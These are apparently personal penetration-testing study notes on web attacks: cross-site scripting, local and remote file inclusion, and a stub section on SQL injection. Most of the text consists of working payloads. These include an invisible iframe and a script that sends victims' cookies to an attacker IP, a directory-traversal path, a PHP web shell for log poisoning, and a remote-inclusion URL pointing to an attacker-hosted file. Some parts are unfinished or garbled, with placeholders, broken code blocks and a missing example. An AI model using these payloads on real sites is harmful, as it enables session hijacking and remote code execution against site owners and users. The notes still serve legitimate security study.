# Web application attacks

## Cross site scripting

Caused by unsanitized user input that is then displayed on a web page

Need a simple example to testing for XSS with an alert

**Browser redirection and iFrame injection**

* Injecting an invisible iframe

`<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>`

* When the victim visits the page, their browser connects to the attacking machine \(required netcat listener, port 80\)

**Stealing cookies and session information**

`<script> new Image().src=”http://10.11.0.5/bogus.php?output=”+document.cookie; </script>`

* The victim browsing the page makes a connection back to us with an authenticated session value \(listener required\)
* Use a cookie editor like Cookies Manager to steal the session

## File inclusion vulnerabilities

### LFI

Look for pages that include a parameter in the URL, such as:

*  Test for LFI by navigating to:

`../../../../../../windows/system32/drivers/etc/hosts`

In PHP versions below 5.3, terminate the request with a null byte "\(%00\)"

Contaminating log files

`<?php echo shell_exec($_GET[‘cmd’]);?>`

From LFI to code execution

```text
#### RFI

   Create evil.txt and setup our webserver to host it

```Evil.txt = <?php echo shell_exec(“ipconfig”);?>
```

`http://target.com/?page=http://attackerip/evil.txt%00`

## SQL injection

See notes for examples; GitHub errors when SQLI code inserted
